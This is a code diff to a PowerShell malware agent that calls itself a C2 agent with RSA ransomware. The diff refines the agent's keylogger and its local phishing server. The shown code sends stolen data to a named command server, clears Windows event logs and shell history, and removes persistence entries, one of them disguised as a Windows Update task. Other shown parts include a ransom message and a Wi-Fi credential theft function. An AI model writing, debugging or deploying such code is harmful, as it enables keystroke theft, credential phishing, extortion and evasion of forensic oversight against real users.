@@ -1,5 +1,10 @@
 # BomKaosKaki.ps1 - Full C2 Agent with RSA Ransomware & Decrypt (Complete)
 # Two-way communication: sends heartbeats & exfil, polls for commands
+# ============ BUG FIXES ============
+# - Fixed Send-ExfilData JSON return value
+# - Improved Keylogger accuracy (character mapping, shift/caps handling)
+# - Added random port fallback for Phishing server
+# - Fixed Invoke-Uninstall CleanTraces call
 
 # ============ CONFIGURATION ============
 $C2Server = "https://bom-kaos-kaki.vercel.app"
@@ -17,6 +22,7 @@ $Script:LastHeartbeat = (Get-Date)
 $Script:LockdownActive = $false
 $Script:KeyloggerJob = $null
 $Script:SpywareJob = $null
+$Script:PhishingJob = $null
 
 # ============ RSA PUBLIC KEY (GANTI DENGAN PUBLIC KEY ANDA) ============
 $RsaPublicKey = @"
@@ -72,7 +78,6 @@ function Invoke-WebRequestWithRetry {
         }
         catch {
             if ($i -eq $MaxRetries - 1) { 
-                # No Write-Host for stealth, but keep for debugging; comment out if needed
                 # Write-Host "[!] Request failed after $MaxRetries retries: $_" -ForegroundColor Red
             }
             Start-Sleep -Seconds 2
@@ -112,6 +117,7 @@ function Send-ExfilData {
                 timestamp  = Get-Timestamp
             }
             $result = Invoke-WebRequestWithRetry -Uri "$C2Server/api/exfil" -Method POST -Body $payload
+            # FIX: check $result.success (hashtable)
             return $result.success
         }
     }
@@ -438,7 +444,7 @@ Your files will be lost forever if you try to bypass.
     Show-FullscreenPopup $msg
 }
 
-# ============ KEYLOGGER ============
+# ============ KEYLOGGER (FIXED) ============
 function Invoke-Keylogger {
     param($cmd)
     if ($Script:KeyloggerRunning) { return "Keylogger already running" }
@@ -472,13 +478,16 @@ public class NativeMethods {
             48 = ')'; 49 = '!'; 50 = '@'; 51 = '#'; 52 = '$'; 53 = '%'
             54 = '^'; 55 = '&'; 56 = '*'; 57 = '('
         }
+        $lastKeyState = @{}
         while ($true) {
             Start-Sleep -Milliseconds 50
             for ($i = 8; $i -le 190; $i++) {
                 $state = [NativeMethods]::GetAsyncKeyState($i)
-                if ($state -band 0x8000) {
+                $isPressed = ($state -band 0x8000) -ne 0
+                $wasPressed = $lastKeyState.ContainsKey($i) -and $lastKeyState[$i]
+                if ($isPressed -and -not $wasPressed) {
                     $keyChar = ""
-                    $isShift = [NativeMethods]::GetAsyncKeyState(16) -band 0x8000
+                    $isShift = ([NativeMethods]::GetAsyncKeyState(16) -band 0x8000) -ne 0
                     $isCaps = [Console]::CapsLock
                     if ($i -ge 65 -and $i -le 90) {
                         $char = [char]$i
@@ -492,22 +501,22 @@ public class NativeMethods {
                     elseif ($keyMap.ContainsKey($i)) { $keyChar = $keyMap[$i] }
                     else { $keyChar = [char]$i }
                     if ($keyChar -and $keyChar -ne "") {
-                        $windowTitle = ""
                         $hwnd = [NativeMethods]::GetForegroundWindow()
                         if ($hwnd -ne [IntPtr]::Zero) {
                             $sb = New-Object System.Text.StringBuilder 256
                             if ([NativeMethods]::GetWindowText($hwnd, $sb, 256) -gt 0) {
                                 $windowTitle = $sb.ToString()
+                                if ($windowTitle -ne $lastWindow -and $windowTitle -ne "") {
+                                    $buffer += "[ Window: $windowTitle ]`n"
+                                    $lastWindow = $windowTitle
+                                }
                             }
-                        }
-                        if ($windowTitle -ne $lastWindow -and $windowTitle -ne "") {
-                            $buffer += "[ Window: $windowTitle ]`n"
-                            $lastWindow = $windowTitle
                         }
                         $buffer += $keyChar
                         try { [System.IO.File]::AppendAllText($logPath, $keyChar) } catch {}
                     }
                 }
+                $lastKeyState[$i] = $isPressed
             }
             if ((Get-Date) - $lastSend -gt [TimeSpan]::FromSeconds(30) -and $buffer.Length -gt 0) {
                 try {
@@ -579,6 +588,7 @@ function Invoke-Screenshot {
     catch { return "Screenshot failed: $($_.Exception.Message)" }
 }
 
+# ============ PHISHING (FIXED: random port fallback) ============
 function Invoke-Phishing {
     param($cmd)
     $phishingDir = "$env:TEMP\kaoskaki_phishing"
@@ -592,7 +602,18 @@ function Invoke-Phishing {
     $htmlPath = "$phishingDir\index.html"
     [System.IO.File]::WriteAllText($htmlPath, $html)
     $port = 8080
-    Start-Job -ScriptBlock {
+    # Test if port 8080 is available
+    $listenerTest = New-Object System.Net.HttpListener
+    $listenerTest.Prefixes.Add("http://localhost:$port/")
+    try {
+        $listenerTest.Start()
+        $listenerTest.Stop()
+        $listenerTest.Close()
+    }
+    catch {
+        $port = Get-Random -Minimum 10000 -Maximum 60000
+    }
+    $Script:PhishingJob = Start-Job -ScriptBlock {
         param($dir, $port, $sessionId, $c2Server)
         $listener = New-Object System.Net.HttpListener
         $listener.Prefixes.Add("http://localhost:$port/")
@@ -616,7 +637,7 @@ function Invoke-Phishing {
             }
             $response.Close()
         }
-    } -ArgumentList $phishingDir, $port, $Script:SessionId, $C2Server | Out-Null
+    } -ArgumentList $phishingDir, $port, $Script:SessionId, $C2Server
     $result = @{ local_url = "http://localhost:$port"; directory = $phishingDir; port = $port }
     Send-ExfilData -Type "phishing" -Data $result
     return "Phishing page running on http://localhost:$port. Use ngrok to expose externally."
@@ -715,7 +736,7 @@ function Invoke-Spyware {
 }
 
 function Invoke-CleanTraces {
-    param($cmd)
+    param($cmd)   # parameter ignored, kept for compatibility
     $cleaned = @()
     try { Remove-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Force -ErrorAction SilentlyContinue; $cleaned += "powershell_history" } catch {}
     try { wevtutil cl "Windows PowerShell" 2>$null; wevtutil cl "Microsoft-Windows-PowerShell/Operational" 2>$null; wevtutil cl "Security" 2>$null; wevtutil cl "System" 2>$null; wevtutil cl "Application" 2>$null; $cleaned += "event_logs" } catch {}
@@ -775,7 +796,8 @@ function Invoke-StealWiFi {
 
 function Invoke-Uninstall {
     param($cmd)
-    $null = Invoke-CleanTraces $cmd
+    # FIX: Call CleanTraces without passing $cmd (the function ignores the param anyway)
+    $null = Invoke-CleanTraces
     try { Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "KaosKaki" -Force -ErrorAction SilentlyContinue } catch {}
     try { Remove-Item "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\kaoskaki.vbs" -Force -ErrorAction SilentlyContinue } catch {}
     try { Unregister-ScheduledTask -TaskName "WindowsUpdate_KaosKaki" -Confirm:$false -ErrorAction SilentlyContinue } catch {}
